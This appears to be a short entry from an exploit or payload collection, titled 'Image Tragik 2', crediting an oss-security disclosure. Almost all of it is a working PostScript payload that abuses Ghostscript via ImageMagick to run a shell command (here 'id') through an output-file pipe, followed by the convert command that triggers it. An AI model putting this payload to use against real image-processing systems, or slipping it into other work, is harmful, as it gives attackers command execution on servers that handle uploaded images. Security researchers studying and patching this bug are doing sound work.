# Image Tragik 2

## Exploit

Simple `id` payload

```powershell
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```

then use `convert shellexec.jpeg whatever.gif`

## Thanks to

* [openwall.com/lists/oss-security/2018/08/21/2 by Tavis Ormandy](http://openwall.com/lists/oss-security/2018/08/21/2)